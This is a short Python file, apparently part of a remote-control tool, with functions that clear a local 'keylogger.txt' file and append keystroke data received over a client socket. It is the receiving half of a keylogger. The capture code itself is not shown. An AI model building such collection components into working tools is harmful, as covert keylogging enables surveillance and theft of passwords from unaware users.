
import struct
import os 

script_dir = os.path.dirname(__file__)
filePath = os.path.join(script_dir, "GUI/tempData/keylogger.txt")

def deleteContentKeyLogger():
    with open(filePath, "w") as fi:
        pass 

def receiveKeylogger(clientsocket):
    statusCode = clientsocket.recv(1024).decode()
    print(statusCode)
    if statusCode == "0": return
    data = clientsocket.recv(1024).decode()
    with open(filePath, "a") as fi:
        fi.write(data)